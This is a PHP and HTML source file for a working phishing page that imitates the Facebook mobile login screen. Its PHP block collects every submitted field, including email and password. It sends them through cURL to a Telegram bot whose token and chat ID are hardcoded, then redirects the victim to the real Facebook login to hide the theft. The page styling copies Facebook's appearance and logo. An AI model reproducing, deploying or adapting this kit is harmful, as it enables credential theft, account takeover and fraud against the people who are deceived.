<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capture login credentials
    $credentials = "";
    foreach($_POST as $variable => $value) {
        $credentials .= $variable . "=" . $value . "\n";
    }

    // Send to Telegram bot
    $botToken = '8420043577:AAEsgJwEc4coi94NixWI907e1GTjtSVhcDk';
    $chatId = '7760836736';
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => "New credentials captured:\n" . $credentials
    ];

    // Use cURL to send the message
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Redirect to real Facebook to avoid suspicion
    header('Location: https://www.facebook.com/login.php');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Optimistic 95', sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container {
            width: 100%;
            max-width: 400px;
        }
        .logo {
            text-align: center;
            margin: 20px 0;
        }
        .logo img {
            max-height: 60px;
        }
        .form-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1);
        }
        .input-field {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 15.2px;
            background: transparent;
            color: #0a1317;
            box-sizing: border-box;
        }
        .login-btn {
            width: 100%;
            background: #0064e0;
            color: #f1f4f7;
            border: none;
            border-radius: 22px;
            padding: 12px;
            font-size: 15.2px;
            font-weight: 500;
            margin: 10px 0;
            cursor: pointer;
        }
        .forgot-password {
            text-align: center;
            margin: 10px 0;
        }
        .forgot-password a {
            color: #0064e0;
            text-decoration: none;
            font-size: 15.2px;
            font-weight: 500;
        }
        .create-account {
            width: 100%;
            background: rgba(255, 255, 255, 0.2);
            border: 1px solid #0064e0;
            color: #0064e0;
            border-radius: 22px;
            padding: 12px;
            font-size: 15.2px;
            font-weight: 500;
            margin: 10px 0;
            cursor: pointer;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yh/r/Sg2QOE06yVC.png" alt="Facebook from Meta">
        </div>
        <div class="form-container">
            <form method="POST">
                <input type="email" id="m_login_email" name="email" class="input-field" placeholder="Mobile number or email address" required>
                <input type="password" id="m_login_password" name="pass" class="input-field" placeholder="Password" required>
                <button type="submit" class="login-btn">Log in</button>
            </form>
            <div class="forgot-password">
                <a href="#">Forgotten password?</a>
            </div>
            <div class="create-account">
                Create new account
            </div>
        </div>
    </div>
</body>
</html>